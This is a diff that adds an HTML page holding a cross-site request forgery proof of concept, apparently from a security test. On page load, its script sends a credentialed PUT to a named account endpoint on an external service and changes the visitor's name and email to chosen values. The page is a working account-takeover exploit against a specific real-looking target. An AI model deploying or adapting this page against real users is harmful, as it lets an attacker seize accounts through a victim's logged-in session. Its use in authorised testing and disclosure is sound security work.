@@ -1,0 +1,19 @@
+<html>
+
+<body>
+	<script>
+		var xhr2 = new XMLHttpRequest();
+
+		xhr2.open("PUT", "https://alsok.eagleeyenetworks.com/g/user", true);
+
+		xhr2.withCredentials = true;
+
+		xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");
+
+		xhr2.onreadystatechange = function() { if(xhr2.readyState == 4) alert(xhr2.responseText); };
+
+		xhr2.send("first_name=csrf&last_name=kensho&email=websec-test01%2B050%40kccs.co.jp");
+	</script>
+</body>
+
+</html>
